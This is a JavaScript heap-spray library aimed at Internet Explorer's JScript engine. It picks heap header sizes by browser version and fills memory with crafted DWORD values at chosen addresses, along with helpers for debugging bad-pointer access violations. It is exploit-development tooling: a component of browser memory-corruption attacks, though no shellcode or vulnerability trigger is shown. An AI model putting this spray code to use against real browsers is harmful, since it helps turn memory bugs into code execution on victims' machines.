console = window.console || {"log": function(){}};
function bad(p­Address) {
  // convert a valid 32-bit pointer to an invalid one that is easy to convert
  // back. Useful for debugging: use a bad pointer, get an AV whenever it is
  // used, then fix pointer and continue with exception handled to have see what
  // happens next.
  return 0x80000000 + p­Address;
}
function blanket(d­Spray_­dw­Value_­p­Address, p­Address) {
  // Can be used to store values that indicate offsets somewhere in the heap
  // spray. Useful for debugging: blanket region, get an AV at an address
  // that indicates where the pointer came from. Does not overwrite addresses
  // at which data is already stored.
  for (var u­Offset = 0; u­Offset < 0x40; u­Offset += 4) {
    if (!((p­Address + u­Offset) in d­Spray_­dw­Value_­p­Address)) {
      d­Spray_­dw­Value_­p­Address[p­Address + u­Offset] = bad(((p­Address & 0x­FFF) << 16) + u­Offset);
    }
  }
}
var gu­Spray­Block­Size = 0x02000000; // how much fragmentation do you want?
var gu­Spray­Page­Size  = 0x00001000; // block alignment.

// Different versions of MSIE have different heap header sizes:
var s­JSVersion;
try{
  /*@cc_­on @*/
  s­JSVersion = eval("@_jscript_­version");
} catch(e) {
  s­JSVersion = "unknown"
};
var gu­Heap­Header­Size = {
    "5.8": 0x24,
    "9": 0x10, // MSIE9
    "unknown": 0x10
}[s­JSVersion]; // includes BSTR length
var gu­Heap­Footer­Size = 0x04;
if (!gu­Heap­Header­Size)
    throw new Error("Unknown script version " + s­JSVersion);

function create­Spray­Block(d­Spray_­dw­Value_­p­Address) {
  // Create a spray "page" and store spray data at the right offset.
  var s­Spray­Page = "\u­DEAD".repeat(gu­Spray­Page­Size >> 1);
  for (var p­Address in d­Spray_­dw­Value_­p­Address) {
    s­Spray­Page = s­Spray­Page.replace­DWord(p­Address % gu­Spray­Page­Size, d­Spray_­dw­Value_­p­Address[p­Address]);
  }
  // Create a spray "block" by concatinated copies of the spray "page", taking into account the header and footer
  // used by MSIE for larger heap allocations.
  var u­Spray­Pages­Per­Block = Math.ceil(gu­Spray­Block­Size / gu­Spray­Page­Size);
  var s­Spray­Block = (
    s­Spray­Page.substr(gu­Heap­Header­Size >> 1) +
    s­Spray­Page.repeat(u­Spray­Pages­Per­Block - 2) +
    s­Spray­Page.substr(0, s­Spray­Page.length - (gu­Heap­Footer­Size >> 1))
  );
  var u­Actual­Spray­Block­Size = gu­Heap­Header­Size + s­Spray­Block.length * 2 + gu­Heap­Footer­Size;
  if (u­Actual­Spray­Block­Size != gu­Spray­Block­Size)
      throw new Error("Assertion failed: spray block (" + u­Actual­Spray­Block­Size.to­String(16) + ") should be " + gu­Spray­Block­Size.to­String(16) + ".");
  console.log("create­Spray­Block():");
  console.log("  s­Spray­Page.length: " + s­Spray­Page.length.to­String(16));
  console.log("  u­Spray­Pages­Per­Block: " + u­Spray­Pages­Per­Block.to­String(16));
  console.log("  s­Spray­Block.length: " + s­Spray­Block.length.to­String(16));
  return s­Spray­Block;
}
function get­Heap­Block­Index­For­Address(p­Address) {
  return ((p­Address % gu­Spray­Page­Size) - gu­Heap­Header­Size) >> 1;
}
function get­Spray­Block­Count(d­Spray_­dw­Value_­p­Address, p­Start­Address) {
  p­Start­Address = p­Start­Address || 0;
  var p­Target­Address = 0x0;
  for (var p­Address in d­Spray_­dw­Value_­p­Address) {
    p­Target­Address = Math.max(p­Target­Address, p­Address);
  }
  u­Spray­Blocks­Count = Math.ceil((p­Target­Address - p­Start­Address) / gu­Spray­Block­Size);
  console.log("get­Spray­Block­Count():");
  console.log("  p­Target­Address: " + p­Target­Address.to­String(16));
  console.log("  u­Spray­Blocks­Count: " + u­Spray­Blocks­Count.to­String(16));
  return u­Spray­Blocks­Count;
}
function spray­Heap(d­Spray_­dw­Value_­p­Address, p­Start­Address) {
  var u­Spray­Blocks­Count = get­Spray­Block­Count(d­Spray_­dw­Value_­p­Address, p­Start­Address);
  // Spray the heap by making copies of the spray "block".
  var as­Spray = new Array(u­Spray­Blocks­Count);
  as­Spray[0] = create­Spray­Block(d­Spray_­dw­Value_­p­Address);
  for (var u­Index = 1; u­Index < as­Spray.length; u­Index++) {
    as­Spray[u­Index] = as­Spray[0].clone();
  }
  return as­Spray;
}